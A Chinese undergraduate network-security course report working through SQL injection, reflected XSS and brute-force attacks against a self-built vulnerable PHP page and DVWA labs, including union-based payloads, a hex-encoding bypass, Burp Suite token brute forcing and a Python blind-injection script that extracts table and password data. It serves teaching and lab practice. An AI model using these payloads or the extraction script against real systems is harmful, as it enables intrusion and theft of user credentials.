                                         **<font size=6> 中国矿业大学计算机学院 </font> **

​                                            **<font size=6>2017 级本科生课程报告</font>**



​                                                 课程名称：        网络安全

​                                                 学生姓名：        张寅                

​                                                 学号：              08173132

​                                                 专业：               信息安全

​                                                 任课教师：        鲍宇

​                                                  报告时间：       2019.12.1







------



[TOC]



------

# 作业二——（一）sql注入

## 一、环境搭建

### 1、安装wampserver

wampserver在windows下将Apache+PHP+Mysql 集成,一键操作，比较方便

### 2、安装后的可能会遇到的问题

安装完成后，打开，电脑右下角wampserver的图标应该是绿色的，如果是红色和橙色，那就是有些服务没有开启，在图标上左键查看是哪个服务没有开启。

![Qefo7R.png](https://s2.ax1x.com/2019/12/01/Qefo7R.png)

在安装的时候就是橙色的，原因是之前做的计网实验开启了IIS服务，与apache服务冲突了，所以关掉IIS服务就可以了，具体方法为：计算机——有键——管理——服务，找到IIS关闭即可。如果之前的数据库实验用的不是MySQL，而是SQL sever，则需要将SQL server服务也关闭，方法同上。

### 3、编写登录页和测试页

左键wampserver的小图标，打开www目录，进入，新建两个文件，login.php,test.php。编辑两个文件，代码如下：

login.php:

```php
<html>
<head>
<title>网络安全作业二</title>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
</head>
 <body >
<form action="test.php" method="post">
  <fieldset >
    <legend>自建sql注入平台</legend>
    <table>
      <tr>
        <td>用户名：</td>
        <td><input type="text" name="username"></td>
      </tr>
      <tr>
        <td>密  码：</td>
        <td><input type="text" name="password"></td>
      </tr>
      <tr>
        <td><input type="submit" value="提交"></td>
        <td><input type="reset" value="重置"></td>
      </tr>
    </table>
  </fieldset>
</form>
</body>
</html>
```

test.php:

```php
<?php
$pwd=$_POST['password'];
$uname=$_POST['username'];
//echo "您当前执行的sql语句为：" ;
//echo "select * from admin where passward='$pwd' and name='$uname'<br/>";
//echo "<hr>";
$mysqli = new mysqli('127.0.0.1','root','','sqlin'); 
if(mysqli_connect_errno()){
    printf("连接失败:%s<br>",mysqli_connect_error());
    exit();
}
$result = $mysqli->query("select * from admin where name='$uname'");
//print_r($result->fetch_array(MYSQLI_ASSOC));
if($row=mysqli_fetch_row($result))
{
	printf ("%s : %s",$row[0],$row[1]);
       	echo "<br>";
	echo "success！";
}
else
{
	echo "账号或密码错误！";
}
$mysqli->close();
$result->close();?>
```

然后在浏览器上输入http://localhost/login.php，即可进入登陆页面。

不过目前还没有数据库信息，在wampserver小图标左键打开mysql,进入，默认无密码，建立名为sqlin的数据库，和名为admin的表

![Qefs7n.png](https://s2.ax1x.com/2019/12/01/Qefs7n.png)

![QeffcF.png](https://s2.ax1x.com/2019/12/01/QeffcF.png)

这样环境就搭好了，可以开始注入了。

## 二、简单注入

### 判断有几个显示位。

输入如下:

```bash
用户名：1' union select 1,2,3#
密码：111（任意）
```

发现报错，显示位不是3，重试

```bash
用户名：1' union select 1,2#
密码：111（任意）
```

![QefHtx.png](https://s2.ax1x.com/2019/12/01/QefHtx.png)

显示位为两位

### 确定表有几列

```bash
用户名：1' order by 3#
密码：111（任意）
```

报错，不是3列

```bash
用户名：1' order by 2#
密码：111（任意）
```

![QefXcD.png](https://s2.ax1x.com/2019/12/01/QefXcD.png)

表有2列

### 获取数据库名

```bash
用户名：1' union select 1,database() #
密码：111（任意）
```

![Qeh9AI.png](https://s2.ax1x.com/2019/12/01/Qeh9AI.png)

数据库名为sqlin

### 获取表名

```bash
用户名：1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
密码：111（任意）
```

![QehF9f.png](https://s2.ax1x.com/2019/12/01/QehF9f.png)

表名为admin

### 获取列名

```bash
用户名：0' union select (select column_name from information_schema.columns where table_name='admin' limit 0,1),(select column_name from information_schema.columns where table_name='admin' limit 1,2)#
密码：111（任意）
```

![QeheBj.png](https://s2.ax1x.com/2019/12/01/QeheBj.png)

列名为name,passward

### 获取数据

```bash
用户名：1' union select name,passward from admin#
密码：111（任意）
```

![QehKNq.png](https://s2.ax1x.com/2019/12/01/QehKNq.png)

得到用户名及密码

（建表的时候把password拼错了）😂

## 三、注入漏洞修补

由于select语句并没有对输入的用户名进行检测，而是拿来直接用，造成的注入漏洞，可以对输入的用户名进行长度限制，或者过滤。

# 作业二——（二）xss攻击

## 一、建立漏洞页面

在www目录下新建xss.php,代码如下

```php
<!DOCTYPE html>
<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
		<title>xss漏洞简单搭建</title>
	</head>
	<body>
		<center>
			<h6>把我们输入的字符串输出到input里的value属性里</h6>
			<form action="" method="get">
				<h6>请输入你想显现的字符串</h6>
				<input type="text" name="xss_input_value" value="输入"><br />
				<input type='submit'>
			</form>
			<hr>
	
			<?php
			//php防注入和XSS攻击通用过滤
$_GET     && SafeFilter($_GET);
$_POST    && SafeFilter($_POST);
$_COOKIE  && SafeFilter($_COOKIE);
  
function SafeFilter (&$arr) 
{
   $ra=Array('/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/','/script/','/javascript/','/vbscript/','/expression/','/applet/'
   ,'/meta/','/xml/','/blink/','/link/','/style/','/embed/','/object/','/frame/','/layer/','/title/','/bgsound/'
   ,'/base/','/onload/','/onunload/','/onchange/','/onsubmit/','/onreset/','/onselect/','/onblur/','/onfocus/',
   '/onabort/','/onkeydown/','/onkeypress/','/onkeyup/','/onclick/','/ondblclick/','/onmousedown/','/onmousemove/'
   ,'/onmouseout/','/onmouseover/','/onmouseup/','/onunload/');
     
   if (is_array($arr))
   {
     foreach ($arr as $key => $value) 
     {
        if (!is_array($value))
        {
          if (!get_magic_quotes_gpc())  //不对magic_quotes_gpc转义过的字符使用addslashes(),避免双重转义。
          {
             $value  = addslashes($value); //给单引号（'）、双引号（"）、反斜线（\）与 NUL（NULL 字符）  加上反斜线转义
          }
          $value       = preg_replace($ra,'',$value);     //删除非打印字符，粗暴式过滤xss可疑字符串
          $arr[$key]     = htmlentities(strip_tags($value)); //去除 HTML 和 PHP 标记并转换为 HTML 实体
        }
        else
        {
          SafeFilter($arr[$key]);
        }
     }
   }
}

			if (isset($_GET['xss_input_value']))
			{
				$s=$_GET['xss_input_value'];
				echo'<input type="text" value="'.$_GET['xss_input_value'].'">';
				
				
			}
			else{
				echo '<input type="text" value="输出">';
			}
			
?>

		</center>
		
		</script>
		

	</body>
</html>
```

在浏览器输入http://localhost/xss.php/

进入页面

![QehJu4.png](https://s2.ax1x.com/2019/12/01/QehJu4.png)

输入

```bash
"><img src=1 onerror=alert(/xss/)>
```

![Qeh6DH.png](https://s2.ax1x.com/2019/12/01/Qeh6DH.png)

攻击成功

## 二、漏洞修补

将xss.php中

```bash
//$_GET     && SafeFilter($_GET);
```

注释去掉

```bash
$_GET     && SafeFilter($_GET);
```

通过SafeFilter()函数来过滤输入的内容

再输入刚才的内容

![QehW5t.png](https://s2.ax1x.com/2019/12/01/QehW5t.png)

# DVWA——Brute Force

## 级别：low

先进入DVWA页面，安全等级设置位low,再进入暴力破解的页面

![QehqVs.png](https://s2.ax1x.com/2019/12/01/QehqVs.png)

输入用户名

```bash
admin
```

密码

```bash
123
```

开启burp suite拦截，登陆

![Qehx2T.png](https://s2.ax1x.com/2019/12/01/Qehx2T.png)

选中全部内容，右键发送给intruder

![Qe4VG6.png](https://s2.ax1x.com/2019/12/01/Qe4VG6.png)

点clear清除全部变量，选中123，点add，添加变量

![Qe4ldA.png](https://s2.ax1x.com/2019/12/01/Qe4ldA.png)

在payloads里添加破解字典

![Qe4GJP.png](https://s2.ax1x.com/2019/12/01/Qe4GJP.png)

下面就可以攻击了

burp suite的攻击类型

![Qe4sJ0.png](https://s2.ax1x.com/2019/12/01/Qe4sJ0.png)

Sniper标签 这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。

二、攻击

选择sniper攻击方式，开始攻击

根据攻击结果的length来判断是否成功

![Qe4feJ.png](https://s2.ax1x.com/2019/12/01/Qe4feJ.png)

攻击成功，密码为password

## 级别：medium

Brute Force Source

```php
<?php

if( isset( $_GET[ 'Login' ] ) ) {
    // Sanitise username input
    $user = $_GET[ 'username' ];
    $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitise password input
    $pass = $_GET[ 'password' ];
    $pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $pass = md5( $pass );

    // Check the database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    if( $result && mysqli_num_rows( $result ) == 1 ) {
        // Get users details
        $row    = mysqli_fetch_assoc( $result );
        $avatar = $row["avatar"];

        // Login successful
        echo "<p>Welcome to the password protected area {$user}</p>";
        echo "<img src=\"{$avatar}\" />";
    }
    else {
        // Login failed
        sleep( 2 );
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

medium加了错误密码延迟，low级别的方法还是适用，就是花费时间更长

## 级别：high

Brute Force Source

```php
<?php

if( isset( $_GET[ 'Login' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Sanitise username input
    $user = $_GET[ 'username' ];
    $user = stripslashes( $user );
    $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitise password input
    $pass = $_GET[ 'password' ];
    $pass = stripslashes( $pass );
    $pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $pass = md5( $pass );

    // Check database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    if( $result && mysqli_num_rows( $result ) == 1 ) {
        // Get users details
        $row    = mysqli_fetch_assoc( $result );
        $avatar = $row["avatar"];

        // Login successful
        echo "<p>Welcome to the password protected area {$user}</p>";
        echo "<img src=\"{$avatar}\" />";
    }
    else {
        // Login failed
        sleep( rand( 0, 3 ) );
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

// Generate Anti-CSRF token
generateSessionToken();

?>

```

加了 user_token 一个随机值，来防止用户多次提交

抓包，选择Pitchfork攻击类型，添加爆破的参数 ![Qm0Bb8.png](https://s2.ax1x.com/2019/12/01/Qm0Bb8.png)

options中选择单线程

![Qm022n.png](https://s2.ax1x.com/2019/12/01/Qm022n.png)

 Options中找到Rediections模块，选择always，允许重定向 

![Qm0q2R.png](https://s2.ax1x.com/2019/12/01/Qm0q2R.png)

 在Options中找到Grep-Extract模块，点击Add，并设置筛选条件，得到user_token 

![QmB8s0.png](https://s2.ax1x.com/2019/12/01/QmB8s0.png)

 在Payloads中为选择的参数设置字典 

![QmBtdU.png](https://s2.ax1x.com/2019/12/01/QmBtdU.png)

![QmBrsx.png](https://s2.ax1x.com/2019/12/01/QmBrsx.png)

开始攻击

![QmBcdO.png](https://s2.ax1x.com/2019/12/01/QmBcdO.png)

length长度不一样，密码是password

# DVWA——SQL_Injection

## 级别：low

### 查看源码

```php
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);
}

?>
```

### 分析：

由代码可知，通过`REQUEST`方式接受传递的参数id，再通过sql语句带入查询，并未设置任何过滤，因此可以进行sql注入利用。

### 判断是否存在注入，注入是字符型还是数字型

`输入1，查询成功：`

![KgwPW6.png](https://s2.ax1x.com/2019/10/28/KgwPW6.png)

`输入1'and '1' ='2，查询失败，返回结果为空：`

![KgwRt1.png](https://s2.ax1x.com/2019/10/28/KgwRt1.png)

`输入1' or '1'='1 页面正常，并返回更多信息，成功查询`

![Kg0wEd.png](https://s2.ax1x.com/2019/10/28/Kg0wEd.png)

**`判断存在的是字符型注入。`**

### 猜解SQL查询语句中的字段数

`输入1' or 1=1 order by 1 #，查询成功： #是注释作用`

![KgDOhR.png](https://s2.ax1x.com/2019/10/28/KgDOhR.png)

`输入1' or 1=1 order by 2 #，查询成功： #是注释作用`

![KgrhUH.png](https://s2.ax1x.com/2019/10/28/KgrhUH.png)

`输入1' or 1=1 order by 3 #，查询失败： #是注释作用`

![KgsUzt.png](https://s2.ax1x.com/2019/10/28/KgsUzt.png)

 `说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。`

### 确认显示的字段顺序

 `输入1' union select 1,2 #，查询成功： #是注释作用 `

![MQK7Of.png](https://s2.ax1x.com/2019/11/11/MQK7Of.png)

 说明执行的SQL语句为select First name,Surname from 表 where ID=’id’… 

### 获取当前数据库

 `输入1' union select 1,database() #，查询成功：#是注释作用 `

![MQMl7D.png](https://s2.ax1x.com/2019/11/11/MQMl7D.png)

 说明当前的数据库为dvwa。 

### 获取数据库中的表

`输入1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功： #是注释作用`

![MQM7C9.png](https://s2.ax1x.com/2019/11/11/MQM7C9.png)

 说明数据库dvwa中一共有两个表，guestbook与users。 

### 获取表中的字段名

`输入1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #，查询成功： #是注释作用`

![MQlbm6.png](https://s2.ax1x.com/2019/11/11/MQlbm6.png)

圈起来是是字段名

### 下载数据

`输入1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功： #是注释作用`

![MQ1ncn.png](https://s2.ax1x.com/2019/11/11/MQ1ncn.png)

 这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。 

## 级别：medium

### 分析

 Medium级别的代码利用mysql_real_escape_string函数对特殊符号\x00,\n,\r,,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。 

![MlYjiV.png](https://s2.ax1x.com/2019/11/11/MlYjiV.png)

 虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数，提交恶意构造的查询参数。 

###  判断是否存在注入，注入是字符型还是数字型 

 `抓包更改参数id为1' or 1=1 # 报错： #是注释作用 `

![MlNW38.png](https://s2.ax1x.com/2019/11/11/MlNW38.png)

![MlNhjg.png](https://s2.ax1x.com/2019/11/11/MlNhjg.png)

![MlNIBj.png](https://s2.ax1x.com/2019/11/11/MlNIBj.png)

 `抓包更改参数id为1 or 1=1 #，查询成功：` 

![MlUAgO.png](https://s2.ax1x.com/2019/11/11/MlUAgO.png)

![MlUEvD.png](https://s2.ax1x.com/2019/11/11/MlUEvD.png)

 `说明存在数字型注入。 `

 由于是数字型注入，服务器端的mysql_real_escape_string函数就形同虚设了，因为数字型注入并不需要借助引号。 

###  猜解SQL查询语句中的字段数 

` 抓包更改参数id为1 order by 2 #，查询成功： `

![MlwIzV.png](https://s2.ax1x.com/2019/11/11/MlwIzV.png)

` 抓包更改参数id为1 order by 3 #，报错： `

![MlwLdJ.png](https://s2.ax1x.com/2019/11/11/MlwLdJ.png)

` 说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。 `

###  确定显示的字段顺序 

 `抓包更改参数id为1 union select 1,2 #，查询成功： `

![Ml0JWq.png](https://s2.ax1x.com/2019/11/11/Ml0JWq.png)

 说明执行的SQL语句为select First name,Surname from 表 where ID=id… 

###  获取当前数据库

 `抓包更改参数id为1 union select 1,database() #，查询成功： `

![Ml0j0g.png](https://s2.ax1x.com/2019/11/11/Ml0j0g.png)

` 说明当前的数据库为dvwa。 `

###  获取数据库中的表 

`抓包更改参数id为1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功：`

![MlBK91.png](https://s2.ax1x.com/2019/11/11/MlBK91.png)

` 说明数据库dvwa中一共有两个表，guestbook与users。 `

###  获取表中的字段名 

`抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=’users ’#，查询失败：`

![Mls0jx.png](https://s2.ax1x.com/2019/11/11/Mls0jx.png)

 这是因为单引号被转义了，变成了\’。可以利用16进制进行绕过 '' 

`抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 #，查询成功：`![MlrFwF.png](https://s2.ax1x.com/2019/11/11/MlrFwF.png)

` 说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。 `

###  下载数据 

`抓包修改参数id为1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：`

![MlraOf.png](https://s2.ax1x.com/2019/11/11/MlraOf.png)

## 级别：high

### SQL Injection Source

```php
<?php

if( isset( $_SESSION [ 'id' ] ) ) {
    // Get input
    $id = $_SESSION[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);        
}

?>
```

###  分析：

 与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。 

###  漏洞利用: 

 虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。由于手工注入的过程与Low级别基本一样，直接最后一步演示下载数据。 

`输入1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：`

![M3q1r6.png](https://s2.ax1x.com/2019/11/12/M3q1r6.png)

High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。

# DVWA——SQL Injection (Blind)

## 级别：low

### SQL Injection (Blind) Source

```php
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Get input
    $id = $_GET[ 'id' ];

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

###  分析：

 Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种： 

` User ID exists in the database.与 User ID is MISSING from the database. `

 所以这里是SQL盲注漏洞。 

###   漏洞利用

 输入1 ，发现 

![M8pniV.png](https://s2.ax1x.com/2019/11/12/M8pniV.png)

 输入 1'， 发现 

![M8CxaR.png](https://s2.ax1x.com/2019/11/12/M8CxaR.png)



 观察到他这里只会出现正确或者错误的两种页面，判定他是一个布尔盲注 

###  获取数据库长度 

```python
    def get_database_length(self):
        self.database_length = 0
        for i in range(1,30):
            self.process('get_database_length',i,30)
            theurl = self.url + "1' and length(database())={0}%23".format(str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.database_length = i
                break
        if self.database_length > 0:
            print('\n==>',self.database_length)
        else:
            print("\ncan not get the database_length")
```

运行结果：

![MGOfVP.png](https://s2.ax1x.com/2019/11/13/MGOfVP.png)

### 检查页面是否正常

```python
 def check(self,text):
        if "User ID exists in the database." in text:
            return True
        elif "User ID is MISSING from the database." in text:
            return False
```

### 获取数据库名

```python
    def get_database(self):
        self.database = ''
        for i in range(1,self.database_length+1):
            for j in self.zifuji:
                self.process(str(i) + ' get_database',j,self.database_length+1)
                theurl = self.url + "1' and ascii(substring(database(),{0},1))={1}%23".format(str(i),str(j)) + "&Submit=Submit#"
                html = self.s.get(theurl,headers=self.headers).text
                if self.check(html):
                    self.database += chr(j)
                    break
            if len(self.database) != i:
                self.database += '666'
        if len(self.database) > 0:
            print('\n==>',self.database)
        else:
            print("\n can not get the database")
```

运行结果：

![MGjklQ.png](https://s2.ax1x.com/2019/11/13/MGjklQ.png)

### 获取表长

```python
    def get_table_length(self):
        for i in range(1,50):
            self.process('get_table_length',i,50)
            theurl = self.url + "1' and (select length(group_concat(table_name)) as a from information_schema.tables where table_schema=database() having a={0})%23".format(str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.table_length.append(i)
                break
        if self.table_length[0] > 0:
            print('\n==>',self.table_length)
        else:
            print('\ncan not get the table_length')
```

运行结果：

![MGjdfO.png](https://s2.ax1x.com/2019/11/13/MGjdfO.png)

### 获取表名

```python
    def get_table_name(self):
        name = ''
        for i in range(1,self.table_length[0]+1):
            for j in self.zifuji:
                self.process('{0} get_table_name'.format(i),j,50)
                theurl = self.url + "1' and (select ascii(substring(group_concat(table_name),{0},1)) as a from information_schema.tables where table_schema=database() having a={1})%23".format(str(i),str(j)) + "&Submit=Submit#"
                html = self.s.get(theurl,headers=self.headers).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        if len(name) > 0:
            print('\n==>',name)
            self.table_name.append(name)
        else:
            print('\ncan not get the table_name')
```

运行结果：

![MJie0g.png](https://s2.ax1x.com/2019/11/13/MJie0g.png)

### 获取表列数量

```python
    def get_column_num(self,table_name):
        self.column_num = 0
        for i in range(1,30):
            self.process('get_column_num',i,30)
            theurl = self.url + "1' and (select count(column_name) as a from information_schema.columns where table_schema=database() and table_name='{0}' having a={1})%23".format(table_name,str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.column_num = i
                break
        if self.column_num > 0:
            print('\n==>',self.column_num)
```

### 获取总长度

```python
    def get_column_length(self,table_name):
        for i in range(1,100):
            self.process('get_column_length',i,100)
            theurl = self.url + "1' and (select length(group_concat(column_name)) as a from information_schema.columns where table_schema=database() and table_name='{0}' having a={1})%23".format(table_name,str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.column_length.append(i)
                break
        if len(self.column_length) >= 1:
            print('\n==>',self.column_length)
        else:
            print('\ncan not get the column_length')
```

### 获取列名

```python
    def get_column_name(self,table_name):
        name = ''
        for i in range(1,self.column_length[0]+1):
            for j in self.zifuji:
                self.process('{0} get_column_name'.format(str(i)),j,100)
                theurl = self.url + "1' and (select ascii(substring(group_concat(column_name),{0},1)) as a from information_schema.columns where table_schema=database() and table_name='{1}' having a={2})%23".format(str(i),table_name,str(j)) + "&Submit=Submit#"
                html = self.s.get(theurl,headers=self.headers).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        if len(name) == self.column_length[0]:
            self.column_name.append(name)
            print('\n==>',self.column_name[0])
        else:
            print('\ncan not get the column_name')
```

运行结果：

![MJFlUH.png](https://s2.ax1x.com/2019/11/13/MJFlUH.png)

### 获取字段数目

```python
    def get_word_num(self,table_name,column_name):
        for i in range(1,100):
            self.process('get_word_num',i,30)
            theurl = self.url + "1' and (select count({0}) as a from {1} having a={2})%23".format(column_name,table_name,str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.word_num = i
                break
        if self.word_num > 0:
            print('\n==>',self.word_num)
        else:
            print('\ncan not get the word_num')
```

### 获取列长

```python
    def get_word_length(self,table_name,column_name):
        for i in range(1,200):
            self.process('get_{0}_length'.format(column_name),i,200)
            theurl = self.url + "1' and (select length(group_concat({0})) as a from {1} having a={2})%23".format(column_name,table_name,str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.word_length.append(i)
                break
        if len(self.word_length) >= 1:
            print('\n==>',self.word_length)
        else:
            print('\ncan not get the word length') 
```

### 获取数据

```python
    def get_word_name(self,table_name,column_name,word_num):
        name = ''
        for i in range(1,self.word_length[word_num]+1):
            for j in self.zifuji:
                self.process('get_{0}_name'.format(str(i)),j,100)
                theurl = self.url + "1' and (select ascii(substring(group_concat({0}),{1},1)) as a from {2} having a={3})%23".format(column_name,str(i),table_name,str(j)) + "&Submit=Submit#"
                html = self.s.get(theurl,headers=self.headers).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        self.word_name.append(name)
        print('\n==>',self.word_name[word_num])
```

运行结果：

![MJAW4J.png](https://s2.ax1x.com/2019/11/13/MJAW4J.png)

## 级别：medium

###  SQL Injection (Blind) Source

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $id = $_POST[ 'id' ];
    $id = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $id ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    //mysql_close();
}

?>
```

### 分析

medium级别与low级别差不多， 将get方式改成post方式即可，数字型注入。

由于他会过滤单引号，所以需要转成16进制。

```python
 def tranhex(self,str1):
        result = '0x'
        for i in str1:
            result += hex(ord(i))[2:]
        return result
```

运行结果：

![MJmPQs.png](https://s2.ax1x.com/2019/11/13/MJmPQs.png)

![MJmaSH.png](https://s2.ax1x.com/2019/11/13/MJmaSH.png)

## 级别：high

### SQL Injection (Blind) Source

```php
<?php

if( isset( $_COOKIE[ 'id' ] ) ) {
    // Get input
    $id = $_COOKIE[ 'id' ];

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // Might sleep a random amount
        if( rand( 0, 5 ) == 3 ) {
            sleep( rand( 2, 4 ) );
        }

        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

### 分析

随便写个1提交

![MJunM9.png](https://s2.ax1x.com/2019/11/13/MJunM9.png)

 是一个cookie注入 

![MJuLLR.png](https://s2.ax1x.com/2019/11/13/MJuLLR.png)

```python
    def get_headers(self,payload):
        headers = {
            'Cookie': "id={0}; security=high; PHPSESSID=ms11imgpftrmfcp27rmk9s006c".format(payload)
        }
```

运行结果：

![MYZAMR.png](https://s2.ax1x.com/2019/11/13/MYZAMR.png)

## 完整脚本

```python 
from Injection import Injection

def main(url):
    Injection(url).run()

if __name__ == '__main__':
    url = "http://192.168.74.1/DVWA/vulnerabilities/sqli_blind/?id="
    main(url
```
